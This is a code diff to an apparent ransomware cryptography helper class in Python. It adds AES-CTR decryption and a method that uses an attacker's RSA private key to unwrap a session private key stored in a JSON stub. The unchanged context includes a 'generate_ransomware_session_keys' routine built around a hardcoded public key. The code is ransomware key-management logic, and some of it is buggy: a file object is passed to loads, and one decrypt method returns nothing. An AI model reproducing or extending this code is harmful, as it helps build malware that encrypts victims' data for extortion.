@@ -3,7 +3,7 @@ from Crypto.PublicKey import RSA
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.Random import get_random_bytes
 from Crypto.Util.Padding import pad, unpad
-from json import dump
+from json import dump, loads
 
 
 class CryptoBB:
@@ -70,12 +70,12 @@ class CryptoBB:
         return rsa_ct, aes_ct, iv
     
 
-    def aescbc_decrypt(aes_key, iv, enc_data):
-
+    def aescbc_decrypt(self, aes_key, iv, enc_data):
+        
         try:
             iv = b64decode(iv)
             aes_key = b64decode(aes_key)
-
+            
             cipher = AES.new(aes_key, AES.MODE_CBC, iv)
             pt = unpad(cipher.decrypt(enc_data), AES.block_size)
 
@@ -97,7 +97,18 @@ class CryptoBB:
 
         return rsa_ct, aes_ct, nonce
     
-    
+
+    def aesctr_decrypt(self, aes_key, nonce, ct):
+
+        try:
+            cipher = AES.new(aes_key, AES.MODE_CTR, nonce=nonce)
+            pt = cipher.decrypt(ct)
+
+        except (ValueError, KeyError):
+
+            print("Incorrect decryption")
+        
+
     def generate_ransomware_session_keys(self, rsa_pubkey):
         """Takes one argument: An RSA public key, which should be hardcoded.
         Generates a new session RSA keypair and encrypts the private key in memory 
@@ -117,7 +128,25 @@ class CryptoBB:
         with open(file_path, 'w') as f:
             f.write(dump(db_stub))
 
-
         rsa_key = RSA.import_key(sess_pubkey)
         
         return rsa_key
+    
+    def decrypt_session_privkey(self, rsa_privkey, path_to_json_db):
+
+        with open(path_to_json_db, 'r') as f:
+            data = loads(f)
+
+        enc_sess_privkey = data['stub']['rsa_privkey']
+        enc_aeskey = data['stub']['aescbc_key']
+        print(enc_aeskey)
+        iv = data['stub']['aescbc_iv']
+        print(iv)
+
+        atkr_privkey = self.load_rsa_pubkey(rsa_privkey)
+        cipher_rsa = PKCS1_OAEP.new(atkr_privkey)
+        sess_aeskey = cipher_rsa.decrypt(enc_aeskey)
+
+        sess_rsa_privkey = self.aescbc_decrypt(sess_aeskey, iv, enc_sess_privkey)
+        
+        return sess_rsa_privkey
